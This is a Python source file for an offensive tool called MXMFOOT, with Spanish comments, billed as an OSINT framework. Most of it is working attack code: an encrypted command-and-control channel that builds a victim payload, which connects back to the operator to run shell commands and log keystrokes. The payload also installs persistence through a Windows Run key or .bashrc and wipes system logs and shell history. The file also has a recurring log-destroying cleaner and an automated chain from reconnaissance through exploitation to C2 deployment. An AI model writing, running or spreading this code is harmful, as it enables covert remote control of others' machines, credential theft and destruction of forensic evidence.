#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                      MXMFOOT - ULTIMATE OSINT FRAMEWORK                        ║
║                        Coded by: ElChinoMX | ZeroDay Crew                      ║
║                      "Más cabrón que SpiderFoot, más letal que BloodHound"     ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import subprocess
import threading
import queue
import base64
import hashlib
import logging
import shutil
import secrets
import string
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Importar módulos personalizados
from modules.dns_enum import DNSEnumerator
from modules.whois_lookup import WhoisLookup
from modules.web_scraper import WebScraper
from modules.social_finder import SocialFinder
from modules.shodan_intel import ShodanIntel
from modules.darkweb_scanner import DarkWebScanner
from modules.ai_recon import AIRecon
from modules.auto_exploit import AutoExploit
from modules.github_leaks import GitHubLeaks
from modules.social_recon import SocialRecon
from modules.neo4j_export import Neo4jExport

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class C2Channel:
    """C2 Channel cifrado para comunicación con víctima"""
    
    def __init__(self, password=None):
        self.password = password or self.generate_password()
        self.key = self.derive_key(self.password)
        self.cipher = Fernet(self.key)
        self.session_id = self.generate_session_id()
        
    def generate_password(self):
        """Genera password fuerte"""
        alphabet = string.ascii_letters + string.digits
        return ''.join(secrets.choice(alphabet) for _ in range(32))
    
    def derive_key(self, password):
        """Deriva clave de cifrado desde password"""
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'mxmfoot_salt_2024',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def generate_session_id(self):
        """Genera ID de sesión único"""
        return hashlib.sha256(os.urandom(32)).hexdigest()[:16]
    
    def encrypt(self, data):
        """Cifra datos"""
        if isinstance(data, dict):
            data = json.dumps(data)
        return self.cipher.encrypt(data.encode())
    
    def decrypt(self, encrypted_data):
        """Descifra datos"""
        decrypted = self.cipher.decrypt(encrypted_data)
        try:
            return json.loads(decrypted.decode())
        except:
            return decrypted.decode()
    
    def create_payload(self, lhost, lport):
        """Crea payload con C2 integrado"""
        payload = f"""
import socket
import subprocess
import base64
import json
import threading
import time
from cryptography.fernet import Fernet

# Configuración C2
C2_HOST = "{lhost}"
C2_PORT = {lport}
KEY = b'{self.key.decode()}'

class C2Client:
    def __init__(self):
        self.cipher = Fernet(KEY)
        self.session_id = "{self.session_id}"
        
    def encrypt(self, data):
        return self.cipher.encrypt(json.dumps(data).encode())
    
    def decrypt(self, data):
        return json.loads(self.cipher.decrypt(data).decode())
    
    def connect(self):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((C2_HOST, C2_PORT))
                s.send(self.encrypt({{"type": "register", "session": self.session_id}}))
                
                while True:
                    data = s.recv(4096)
                    if not data:
                        break
                    cmd = self.decrypt(data)
                    if cmd['type'] == 'exec':
                        result = subprocess.run(cmd['command'], shell=True, capture_output=True, text=True)
                        s.send(self.encrypt({{"type": "result", "output": result.stdout, "error": result.stderr}}))
                    elif cmd['type'] == 'keylog_start':
                        # Keylogging
                        import pynput.keyboard as kb
                        self.keylog_data = []
                        def on_press(key):
                            try:
                                self.keylog_data.append(key.char)
                            except:
                                self.keylog_data.append(str(key))
                        self.listener = kb.Listener(on_press=on_press)
                        self.listener.start()
                        s.send(self.encrypt({{"type": "status", "msg": "keylogging started"}}))
                    elif cmd['type'] == 'keylog_stop':
                        if hasattr(self, 'listener'):
                            self.listener.stop()
                            data = ''.join(str(k) for k in self.keylog_data)
                            s.send(self.encrypt({{"type": "keylog_data", "data": data}}))
                    elif cmd['type'] == 'persistence':
                        self.install_persistence()
                        s.send(self.encrypt({{"type": "status", "msg": "persistence installed"}}))
                    elif cmd['type'] == 'cleanup':
                        self.cleanup_logs()
                        s.send(self.encrypt({{"type": "status", "msg": "logs cleaned"}}))
            except:
                time.sleep(10)
    
    def install_persistence(self):
        import os
        import sys
        if os.name == 'nt':  # Windows
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
        else:  # Linux/Mac
            rc_file = os.path.expanduser("~/.bashrc")
            with open(rc_file, 'a') as f:
                f.write(f"\n{__file__} &\n")
    
    def cleanup_logs(self):
        import os
        import glob
        # Limpiar logs del sistema
        if os.name == 'nt':
            os.system('wevtutil cl System')
            os.system('wevtutil cl Security')
            os.system('wevtutil cl Application')
        else:
            os.system('rm -rf /var/log/*.log')
            os.system('history -c')
            os.system('rm ~/.bash_history')

if __name__ == "__main__":
    client = C2Client()
    client.connect()
"""
        return payload
    
    def start_listener(self, port=4444):
        """Inicia listener C2"""
        print(f"{Fore.CYAN}[*] Iniciando C2 Listener en puerto {port}{Style.RESET_ALL}")
        
        def handle_client(conn, addr):
            print(f"{Fore.GREEN}[+] Conexión C2 establecida desde {addr}{Style.RESET_ALL}")
            
            try:
                # Recibir registro
                data = conn.recv(4096)
                register = self.decrypt(data)
                session = register.get('session')
                print(f"{Fore.BLUE}[*] Sesión registrada: {session}{Style.RESET_ALL}")
                
                # Menú interactivo C2
                while True:
                    print(f"\n{Fore.RED}┌─[MXMFOOT C2 - {session[:8]}]{Style.RESET_ALL}")
                    cmd = input(f"{Fore.RED}└──╼ #{Style.RESET_ALL} ").strip()
                    
                    if cmd == 'help':
                        print(f"""
{Fore.CYAN}Comandos C2:{Style.RESET_ALL}
  shell <cmd>      - Ejecutar comando en sistema víctima
  keylog_start     - Iniciar keylogging
  keylog_stop      - Detener y obtener keylogs
  persistence      - Instalar persistencia
  cleanup          - Limpiar logs automáticamente
  screenshot       - Tomar screenshot (requiere módulo extra)
  download <file>  - Descargar archivo
  exit             - Cerrar sesión
                        """)
                    
                    elif cmd.startswith('shell '):
                        command = cmd[6:]
                        conn.send(self.encrypt({'type': 'exec', 'command': command}))
                        result = self.decrypt(conn.recv(8192))
                        print(f"{Fore.WHITE}{result.get('output', '')}{Style.RESET_ALL}")
                        if result.get('error'):
                            print(f"{Fore.RED}Error: {result['error']}{Style.RESET_ALL}")
                    
                    elif cmd == 'keylog_start':
                        conn.send(self.encrypt({'type': 'keylog_start'}))
                        response = self.decrypt(conn.recv(1024))
                        print(f"{Fore.GREEN}[+] Keylogger iniciado{Style.RESET_ALL}")
                    
                    elif cmd == 'keylog_stop':
                        conn.send(self.encrypt({'type': 'keylog_stop'}))
                        response = self.decrypt(conn.recv(65536))
                        if response.get('data'):
                            print(f"{Fore.YELLOW}Keylogs capturados:{Style.RESET_ALL}")
                            print(response['data'])
                            # Guardar keylogs
                            with open(f"keylogs_{session}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", 'w') as f:
                                f.write(response['data'])
                    
                    elif cmd == 'persistence':
                        conn.send(self.encrypt({'type': 'persistence'}))
                        response = self.decrypt(conn.recv(1024))
                        print(f"{Fore.GREEN}[+] Persistencia instalada{Style.RESET_ALL}")
                    
                    elif cmd == 'cleanup':
                        conn.send(self.encrypt({'type': 'cleanup'}))
                        response = self.decrypt(conn.recv(1024))
                        print(f"{Fore.GREEN}[+] Logs eliminados{Style.RESET_ALL}")
                    
                    elif cmd == 'screenshot':
                        conn.send(self.encrypt({'type': 'exec', 'command': 'import pyautogui; pyautogui.screenshot("screenshot.png")'}))
                        print(f"{Fore.YELLOW}[*] Screenshot capturado{Style.RESET_ALL}")
                    
                    elif cmd.startswith('download '):
                        filepath = cmd[9:]
                        conn.send(self.encrypt({'type': 'download', 'file': filepath}))
                        # Implementar descarga de archivos
                        print(f"{Fore.YELLOW}[*] Descargando {filepath}...{Style.RESET_ALL}")
                    
                    elif cmd == 'exit':
                        conn.close()
                        break
                    
                    else:
                        print(f"{Fore.RED}[-] Comando no reconocido. Usa 'help'{Style.RESET_ALL}")
                        
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            finally:
                conn.close()
        
        # Iniciar servidor
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(5)
        
        print(f"{Fore.GREEN}[+] C2 Listener corriendo en 0.0.0.0:{port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Password C2: {self.password}{Style.RESET_ALL}")
        
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.daemon = True
            thread.start()

class AutoLogCleaner:
    """Auto-delete de logs automático"""
    
    def __init__(self):
        self.log_files = [
            '*.log', '*.log.*', '*.txt',
            '~/.bash_history', '~/.zsh_history',
            '/var/log/auth.log', '/var/log/syslog',
            'C:\\Windows\\System32\\winevt\\Logs\\*.evtx'
        ]
        self.enabled = True
        self.start_cleaner()
    
    def start_cleaner(self):
        """Inicia thread de limpieza automática"""
        def cleaner_loop():
            while self.enabled:
                time.sleep(300)  # Cada 5 minutos
                self.clean_logs()
        
        thread = threading.Thread(target=cleaner_loop, daemon=True)
        thread.start()
    
    def clean_logs(self):
        """Limpia archivos de log"""
        import glob
        
        for pattern in self.log_files:
            try:
                files = glob.glob(os.path.expanduser(pattern))
                for file in files:
                    try:
                        # Sobrescribir con datos aleatorios antes de borrar
                        with open(file, 'wb') as f:
                            f.write(os.urandom(1024 * 1024))  # 1MB de datos aleatorios
                        os.remove(file)
                        print(f"{Fore.GREEN}[+] Log limpiado: {file}{Style.RESET_ALL}")
                    except:
                        pass
            except:
                pass
        
        # Limpiar comandos de shell
        if os.name == 'posix':
            os.system('history -c && rm ~/.bash_history 2>/dev/null')
        elif os.name == 'nt':
            os.system('del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
    
    def stop(self):
        """Detiene el cleaner"""
        self.enabled = False

class MXMFOOT:
    """Clase principal de MXMFOOT"""
    
    def __init__(self, target):
        self.target = target
        self.results = {}
        self.start_time = datetime.now()
        
        # Cargar configuración
        self.config = self.load_config()
        
        # Inicializar módulos
        self.modules = {
            'dns': DNSEnumerator(),
            'whois': WhoisLookup(),
            'web': WebScraper(),
            'social': SocialFinder(),
            'shodan': ShodanIntel(self.config.get('shodan_api_key')),
            'darkweb': DarkWebScanner(),
            'ai': AIRecon(),
            'exploit': AutoExploit(),
            'github': GitHubLeaks(self.config.get('github_token')),
            'social_recon': SocialRecon(
                self.config.get('telegram_token'),
                self.config.get('discord_token')
            )
        }
        
        # Inicializar C2 y cleaner
        self.c2 = None
        self.log_cleaner = AutoLogCleaner()
        
        # Conectar Neo4j si está disponible
        try:
            self.neo4j = Neo4jExport()
        except:
            self.neo4j = None
    
    def load_config(self):
        """Carga configuración desde archivo"""
        config_file = 'config/api_keys.json'
        default_config = {
            'shodan_api_key': '',
            'github_token': '',
            'telegram_token': '',
            'discord_token': '',
            'c2_port': 4444,
            'auto_clean_logs': True,
            'enable_persistence': True
        }
        
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                default_config.update(config)
        except:
            pass
        
        return default_config
    
    def print_banner(self):
        """Imprime banner mamalón"""
        banner = f"""
{Fore.RED}{Style.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ███╗   ███╗██╗  ██╗███╗   ███╗███████╗ ██████╗  ██████╗ ████████╗          ║
║   ████╗ ████║╚██╗██╔╝████╗ ████║██╔════╝██╔═══██╗██╔═══██╗╚══██╔══╝          ║
║   ██╔████╔██║ ╚███╔╝ ██╔████╔██║█████╗  ██║   ██║██║   ██║   ██║             ║
║   ██║╚██╔╝██║ ██╔██╗ ██║╚██╔╝██║██╔══╝  ██║   ██║██║   ██║   ██║             ║
║   ██║ ╚═╝ ██║██╔╝ ██╗██║ ╚═╝ ██║██║     ╚██████╔╝╚██████╔╝   ██║             ║
║   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝      ╚═════╝  ╚═════╝    ╚═╝             ║
║                                                                               ║
║   ███████╗ ██████╗  ██████╗ ████████╗    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗║
║   ██╔════╝██╔═══██╗██╔═══██╗╚══██╔══╝    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║║
║   █████╗  ██║   ██║██║   ██║   ██║       ██║   ██║██║     ██║   ██║██╔████╔██║║
║   ██╔══╝  ██║   ██║██║   ██║   ██║       ██║   ██║██║     ██║   ██║██║╚██╔╝██║║
║   ██║     ╚██████╔╝╚██████╔╝   ██║       ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║║
║   ╚═╝      ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝║
║                                                                               ║
║                    {Fore.YELLOW}Versión 3.0 - Ultimate Edition{Fore.RED}                         ║
║                  {Fore.CYAN}Coded by: ElChinoMX | ZeroDay Crew{Fore.RED}                       ║
║              {Fore.GREEN}"Más cabrón que SpiderFoot, más letal que BloodHound"{Fore.RED}        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
        print(f"{Fore.CYAN}[+] Target: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Start Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Log Cleaner: {'ACTIVADO' if self.config['auto_clean_logs'] else 'DESACTIVADO'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] C2 Port: {self.config['c2_port']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    def run_module(self, module_name):
        """Ejecuta un módulo específico"""
        print(f"\n{Fore.BLUE}[*] Ejecutando módulo: {module_name.upper()}{Style.RESET_ALL}")
        
        try:
            if module_name in self.modules:
                result = self.modules[module_name].scan(self.target)
                self.results[module_name] = result
                print(f"{Fore.GREEN}[+] {module_name.upper()} completado{Style.RESET_ALL}")
                return result
            else:
                print(f"{Fore.RED}[-] Módulo {module_name} no existe{Style.RESET_ALL}")
                return None
        except Exception as e:
            print(f"{Fore.RED}[!] Error en {module_name}: {str(e)}{Style.RESET_ALL}")
            logger.error(f"Error en módulo {module_name}: {str(e)}")
            return None
    
    def run_all(self):
        """Ejecuta todos los módulos OSINT"""
        modules = ['dns', 'whois', 'web', 'social', 'shodan', 'darkweb', 'ai']
        
        for module in modules:
            self.run_module(module)
            time.sleep(1)  # Rate limiting
    
    def run_full_attack_chain(self):
        """Cadena de ataque completa OSINT → Exploit → C2"""
        print(f"\n{Fore.RED}{'🔥'*35}{Style.RESET_ALL}")
        print(f"{Fore.RED}[🔥] INICIANDO CADENA DE ATAQUE COMPLETA{Style.RESET_ALL}")
        print(f"{Fore.RED}{'🔥'*35}{Style.RESET_ALL}")
        
        # 1. OSINT básico
        self.run_all()
        
        # 2. Buscar leaks en GitHub
        github_results = self.run_module('github')
        
        # 3. Recon social
        social_results = self.run_module('social_recon')
        
        # 4. Si tenemos IP, intentar exploit
        if 'shodan' in self.results and self.results['shodan']:
            ip = self.results['shodan'].get('host_info', {}).get('ip')
            ports = [p.get('port') for p in self.results['shodan'].get('open_ports', [])]
            
            if ip:
                print(f"\n{Fore.RED}[*] Objetivo IP: {ip}{Style.RESET_ALL}")
                exploit_results = self.modules['exploit'].auto_exploit(ip, ports)
                self.results['auto_exploit'] = exploit_results
                
                # Si el exploit fue exitoso, desplegar C2
                if exploit_results and any(r.get('success') for r in exploit_results):
                    self.deploy_c2_payload(ip)
        
        # 5. Exportar a Neo4j
        if self.neo4j:
            self.export_to_neo4j()
        
        print(f"\n{Fore.GREEN}[+] Cadena de ataque completada{Style.RESET_ALL}")
    
    def deploy_c2_payload(self, target_ip):
        """Despliega payload C2 en el objetivo"""
        print(f"\n{Fore.RED}[*] Desplegando C2 payload en {target_ip}{Style.RESET_ALL}")
        
        # Inicializar C2
        self.c2 = C2Channel()
        
        # Crear payload
        payload = self.c2.create_payload('0.0.0.0', self.config['c2_port'])
        
        # Guardar payload
        payload_file = f"payload_{int(time.time())}.py"
        with open(payload_file, 'w') as f:
            f.write(payload)
        
        print(f"{Fore.GREEN}[+] Payload generado: {payload_file}{Style.RESET_ALL}")
        
        # Intentar transferir payload al objetivo
        # Esto dependerá del método de explotación
        if 'auto_exploit' in self.results:
            for exploit in self.results['auto_exploit']:
                if exploit.get('success') and exploit.get('session'):
                    # Transferir vía meterpreter
                    session_id = exploit['session']
                    transfer_cmd = f"upload {payload_file} C:\\Users\\Public\\{payload_file}"
                    print(f"{Fore.YELLOW}[*] Transfiere manualmente: msfconsole -x 'sessions -i {session_id}; {transfer_cmd}'{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] C2 Payload listo para desplegar{Style.RESET_ALL}")
    
    def start_c2_listener(self):
        """Inicia el listener C2"""
        if not self.c2:
            self.c2 = C2Channel()
        
        print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.RED}[🎯] INICIANDO C2 LISTENER{Style.RESET_ALL}")
        print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
        
        # Iniciar listener en thread separado
        listener_thread = threading.Thread(
            target=self.c2.start_listener,
            args=(self.config['c2_port'],),
            daemon=True
        )
        listener_thread.start()
        
        print(f"{Fore.GREEN}[+] C2 Listener activo en puerto {self.config['c2_port']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Para conectar víctimas, ejecuta el payload generado{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Password C2: {self.c2.password}{Style.RESET_ALL}")
        
        # Mantener listener activo
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Deteniendo C2 Listener...{Style.RESET_ALL}")
    
    def export_to_neo4j(self):
        """Exporta resultados a Neo4j"""
        if not self.neo4j:
            print(f"{Fore.YELLOW}[!] Neo4j no disponible{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.BLUE}[*] Exportando datos a Neo4j...{Style.RESET_ALL}")
        
        try:
            # Exportar target
            target_data = {
                'target': self.target,
                'timestamp': self.start_time.isoformat(),
                'risk_score': self.results.get('ai', {}).get('risk_score', 0),
                'technologies': self.results.get('ai', {}).get('detected_technologies', [])
            }
            self.neo4j.export_target(target_data)
            
            # Exportar DNS
            if 'dns' in self.results:
                self.neo4j.export_dns_relations(self.target, self.results['dns'])
            
            # Exportar vulnerabilidades
            if 'auto_exploit' in self.results:
                self.neo4j.export_vulnerabilities(self.target, self.results['auto_exploit'])
            
            # Exportar leaks
            if 'github' in self.results:
                self.neo4j.export_leaks(self.target, self.results['github'])
            
            # Exportar redes sociales
            if 'social_recon' in self.results:
                self.neo4j.export_social_graph(self.target, self.results['social_recon'])
            
            print(f"{Fore.GREEN}[+] Datos exportados a Neo4j{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Interfaz Neo4j: http://localhost:7474{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error exportando a Neo4j: {e}{Style.RESET_ALL}")
    
    def show_summary(self):
        """Muestra resumen de hallazgos"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[📊] RESUMEN DE HALLAZGOS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        # DNS
        if 'dns' in self.results:
            dns_data = self.results['dns']
            print(f"\n{Fore.YELLOW}[🌐] DNS ENUMERATION:{Style.RESET_ALL}")
            print(f"    - Subdominios encontrados: {len(dns_data.get('subdomains', []))}")
            print(f"    - Servidores MX: {len(dns_data.get('MX', []))}")
        
        # Shodan
        if 'shodan' in self.results and self.results['shodan']:
            shodan_data = self.results['shodan']
            print(f"\n{Fore.YELLOW}[🛡️] SHODAN INTEL:{Style.RESET_ALL}")
            if 'host_info' in shodan_data:
                print(f"    - IP: {shodan_data['host_info'].get('ip', 'N/A')}")
                print(f"    - Organización: {shodan_data['host_info'].get('org', 'N/A')}")
            print(f"    - Puertos abiertos: {len(shodan_data.get('open_ports', []))}")
            print(f"    - Vulnerabilidades: {len(shodan_data.get('vulnerabilities', []))}")
        
        # GitHub Leaks
        if 'github' in self.results and self.results['github']:
            github_data = self.results['github']
            total_leaks = github_data.get('total', 0)
            print(f"\n{Fore.YELLOW}[📦] GITHUB LEAKS:{Style.RESET_ALL}")
            print(f"    - Total de leaks: {total_leaks}")
            if 'leaks' in github_data:
                for leak_type, leaks in github_data['leaks'].items():
                    print(f"    - {leak_type}: {len(leaks)} archivos")
        
        # Social Recon
        if 'social_recon' in self.results:
            social_data = self.results['social_recon']
            print(f"\n{Fore.YELLOW}[💬] SOCIAL RECON:{Style.RESET_ALL}")
            if 'telegram' in social_data:
                print(f"    - Telegram channels: {len(social_data['telegram'].get('channels', []))}")
                print(f"    - Telegram groups: {len(social_data['telegram'].get('groups', []))}")
            if 'discord' in social_data:
                print(f"    - Discord servers: {len(social_data['discord'].get('servers', []))}")
                print(f"    - Discord invites: {len(social_data['discord'].get('invites', []))}")
        
        # Auto-exploit
        if 'auto_exploit' in self.results:
            exploit_data = self.results['auto_exploit']
            successful = sum(1 for e in exploit_data if e.get('success'))
            print(f"\n{Fore.YELLOW}[💣] AUTO-EXPLOIT:{Style.RESET_ALL}")
            print(f"    - Exploits lanzados: {len(exploit_data)}")
            print(f"    - Exitosos: {successful}")
            if successful > 0:
                print(f"    {Fore.RED}[!] ¡SISTEMA COMPROMETIDO!{Style.RESET_ALL}")
        
        # AI Risk Score
        if 'ai' in self.results:
            ai_data = self.results['ai']
            risk_score = ai_data.get('risk_score', 50)
            risk_level = "CRÍTICO" if risk_score > 75 else "ALTO" if risk_score > 50 else "MEDIO" if risk_score > 25 else "BAJO"
            risk_color = Fore.RED if risk_score > 75 else Fore.YELLOW if risk_score > 50 else Fore.GREEN
            print(f"\n{Fore.YELLOW}[🤖] AI RISK ASSESSMENT:{Style.RESET_ALL}")
            print(f"    - Risk Score: {risk_color}{risk_score}/100{Style.RESET_ALL}")
            print(f"    - Risk Level: {risk_color}{risk_level}{Style.RESET_ALL}")
            print(f"    - Tecnologías detectadas: {', '.join(ai_data.get('detected_technologies', ['Unknown']))}")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    def save_results(self):
        """Guarda resultados en archivo"""
        filename = f"reports/mxmfoot_report_{self.target}_{self.start_time.strftime('%Y%m%d_%H%M%S')}.json"
        
        # Crear directorio reports si no existe
        os.makedirs('reports', exist_ok=True)
        
        report = {
            'target': self.target,
            'timestamp': self.start_time.isoformat(),
            'duration': str(datetime.now() - self.start_time),
            'results': self.results,
            'c2_password': self.c2.password if self.c2 else None
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4)
        
        print(f"\n{Fore.GREEN}[+] Reporte guardado: {filename}{Style.RESET_ALL}")
        
        # Limpiar logs automáticamente si está configurado
        if self.config['auto_clean_logs']:
            print(f"{Fore.YELLOW}[*] Limpiando logs automáticamente...{Style.RESET_ALL}")
            self.log_cleaner.clean_logs()
    
    def cleanup(self):
        """Limpieza final"""
        print(f"\n{Fore.YELLOW}[*] Realizando limpieza...{Style.RESET_ALL}")
        
        # Detener log cleaner
        self.log_cleaner.stop()
        
        # Limpiar archivos temporales
        temp_files = ['*.pyc', '__pycache__', '*.tmp', 'payload_*.py']
        for pattern in temp_files:
            try:
                os.system(f'rm -rf {pattern} 2>/dev/null')
            except:
                pass
        
        # Cerrar conexiones
        if self.neo4j:
            self.neo4j.close()
        
        print(f"{Fore.GREEN}[+] Limpieza completada{Style.RESET_ALL}")

def main():
    """Función principal"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='MXMFOOT - Framework OSINT Ultimate Edition',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  %(prog)s -t ejemplo.com                    # Escaneo OSINT completo
  %(prog)s -t ejemplo.com --full-attack      # Cadena de ataque completa
  %(prog)s -t ejemplo.com --c2-listener      # Iniciar listener C2
  %(prog)s -t 192.168.1.100 --auto-exploit   # Explotación automática
  %(prog)s -t ejemplo.com --github-leaks     # Buscar leaks en GitHub
  %(prog)s -t ejemplo.com --social-recon     # Reconocimiento social
  %(prog)s -t ejemplo.com --neo4j-export     # Exportar a Neo4j
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Dominio, IP o email objetivo')
    parser.add_argument('-m', '--module', choices=['dns', 'whois', 'web', 'social', 'shodan', 
                                                   'darkweb', 'ai', 'github', 'social_recon'],
                        help='Módulo específico a ejecutar')
    parser.add_argument('--full-attack', action='store_true', help='Ejecutar cadena de ataque completa')
    parser.add_argument('--auto-exploit', action='store_true', help='Ejecutar auto-exploit con MSF')
    parser.add_argument('--github-leaks', action='store_true', help='Buscar leaks en GitHub')
    parser.add_argument('--social-recon', action='store_true', help='Reconocimiento en redes sociales')
    parser.add_argument('--neo4j-export', action='store_true', help='Exportar resultados a Neo4j')
    parser.add_argument('--c2-listener', action='store_true', help='Iniciar listener C2')
    parser.add_argument('--c2-port', type=int, default=4444, help='Puerto para C2 listener')
    parser.add_argument('--no-clean', action='store_true', help='Desactivar auto-delete de logs')
    parser.add_argument('-o', '--output', help='Guardar reporte en archivo específico')
    
    args = parser.parse_args()
    
    # Crear instancia principal
    tool = MXMFOOT(args.target)
    
    # Configurar C2 port
    tool.config['c2_port'] = args.c2_port
    
    # Desactivar clean logs si se solicita
    if args.no_clean:
        tool.config['auto_clean_logs'] = False
    
    # Mostrar banner
    tool.print_banner()
    
    # Modo C2 listener
    if args.c2_listener:
        tool.start_c2_listener()
        return
    
    try:
        # Ejecutar según argumentos
        if args.full_attack:
            tool.run_full_attack_chain()
        elif args.auto_exploit:
            # Necesita IP para exploit
            tool.run_module('shodan')
            if 'shodan' in tool.results:
                ip = tool.results['shodan'].get('host_info', {}).get('ip')
                ports = [p.get('port') for p in tool.results['shodan'].get('open_ports', [])]
                if ip:
                    exploit_results = tool.modules['exploit'].auto_exploit(ip, ports)
                    tool.results['auto_exploit'] = exploit_results
        elif args.github_leaks:
            tool.run_module('github')
        elif args.social_recon:
            tool.run_module('social_recon')
        elif args.neo4j_export:
            tool.run_all()
            tool.export_to_neo4j()
        elif args.module:
            tool.run_module(args.module)
        else:
            # Modo default: OSINT completo
            tool.run_all()
        
        # Mostrar resumen
        tool.show_summary()
        
        # Guardar resultados
        tool.save_results()
        
        # Preguntar si quiere iniciar C2 listener
        if 'auto_exploit' in tool.results and any(e.get('success') for e in tool.results['auto_exploit']):
            print(f"\n{Fore.RED}[!] Se detectó acceso exitoso al objetivo{Style.RESET_ALL}")
            response = input(f"{Fore.YELLOW}¿Iniciar C2 listener? (y/n): {Style.RESET_ALL}")
            if response.lower() == 'y':
                tool.start_c2_listener()
    
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Ctrl+C detectado. Saliendo...{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error fatal: {e}{Style.RESET_ALL}")
        logger.exception("Error fatal en ejecución")
    finally:
        tool.cleanup()

if __name__ == "__main__":
    main()
